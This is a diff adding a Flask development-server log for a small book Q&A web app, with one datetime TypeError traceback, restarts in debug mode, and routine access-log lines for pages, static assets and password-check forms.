+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 44, in write_question
+    time = datetime.now().strftime('%Y/%m/%d %H:%M:%S') + timedelta(hours=9)
+TypeError: must be str, not datetime.timedelta
+124.49.105.89 - - [21/Oct/2020 03:38:54] "[37mGET /write_question?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:54] "[37mGET /write_question?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:54] "[37mGET /write_question?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:54] "[37mGET /write_question?__debugger__=yes&cmd=resource&f=ubuntu.ttf HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:38:54] "[37mGET /write_question?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1[0m" 200 -
+ * Detected change in '/home/ubuntu/booksalon_flask/app.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+124.49.105.89 - - [21/Oct/2020 03:40:47] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:47] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:47] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:47] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:47] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:47] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:47] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:47] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:47] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:47] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[32mPOST /write_question HTTP/1.1[0m" 302 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:49] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:59] "[37mGET /detail?id=5f8fa81b152e147082793241 HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:59] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:59] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:59] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:59] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:59] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:59] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:59] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:59] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:40:59] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:01] "[37mGET /checkpw?id=5f8fa81b152e147082793241&type=q HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:01] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:01] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:01] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:01] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:01] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:01] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:01] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:01] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:01] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:03] "[32mPOST /check_password?id=5f8fa81b152e147082793241&reply_id=&type=q HTTP/1.1[0m" 302 -
+124.49.105.89 - - [21/Oct/2020 03:41:03] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:03] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:03] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:04] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:04] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:04] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:04] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:04] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:04] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:04] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:04] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:51] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:51] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:51] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:51] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:51] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:51] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:51] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:51] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:51] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:51] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:41:51] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:04] "[37mGET /detail?id=5f8fadc11657af13f5c58c6f HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:04] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:04] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:04] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:04] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:04] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:04] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:04] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:04] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:04] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:59] "[37mGET /checkpw?id=5f8fadc11657af13f5c58c6f&type=q HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:59] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:59] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:59] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:59] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:59] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:59] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:59] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:59] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:42:59] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:02] "[32mPOST /check_password?id=5f8fadc11657af13f5c58c6f&reply_id=&type=q HTTP/1.1[0m" 302 -
+124.49.105.89 - - [21/Oct/2020 03:43:02] "[37mGET /detail?id=5f8fadc11657af13f5c58c6f HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:02] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:02] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:02] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:02] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:02] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:02] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:02] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:02] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:02] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:04] "[37mGET /checkpw?id=5f8fadc11657af13f5c58c6f&type=q HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:04] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:04] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:04] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:04] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:04] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:04] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:04] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:04] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:04] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[32mPOST /check_password?id=5f8fadc11657af13f5c58c6f&reply_id=&type=q HTTP/1.1[0m" 302 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:06] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:51] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:51] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:52] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:52] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:52] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:52] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:52] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:52] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:52] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:43:52] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[32mPOST /write_question HTTP/1.1[0m" 302 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:23] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:31] "[37mGET /detail?id=5f8fae971657af13f5c58c70 HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:31] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:31] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:31] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:31] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:31] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:31] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:31] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:31] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:44:31] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+124.49.105.89 - - [21/Oct/2020 03:49:01] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:01] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:01] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:01] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:01] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:01] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:01] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:01] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:01] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:01] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:01] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:10] "[37mGET /detail?id=5f8fae971657af13f5c58c70 HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:10] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:10] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:10] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:10] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:10] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:10] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:10] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:10] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:49:10] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+124.49.105.89 - - [21/Oct/2020 03:52:03] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:52:03] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:52:03] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:52:03] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:52:03] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:52:03] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:52:03] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:52:03] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:52:03] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:52:03] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:52:03] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+124.49.105.89 - - [21/Oct/2020 03:54:40] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:40] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:40] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:40] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:40] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:40] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:40] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:40] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:40] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:40] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:40] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:58] "[37mGET /detail?id=5f8fae971657af13f5c58c70 HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:58] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:58] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:58] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:58] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:58] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:58] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:58] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:58] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:54:58] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:55:24] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:55:24] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:55:24] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:55:24] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:55:24] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:55:24] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:55:24] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:55:24] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:55:24] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:55:24] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:55:24] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:24] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:24] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:24] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:24] "[37mGET /static/css/reset.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:24] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:24] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:24] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:24] "[37mGET /static/css/header.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:24] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:24] "[37mGET /static/css/footer.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:24] "[37mGET /static/css/bookinfo.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:25] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+124.49.105.89 - - [21/Oct/2020 03:57:35] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [21/Oct/2020 03:57:38] "[37mGET /detail?id=5f8fae971657af13f5c58c70 HTTP/1.1[0m" 200 -
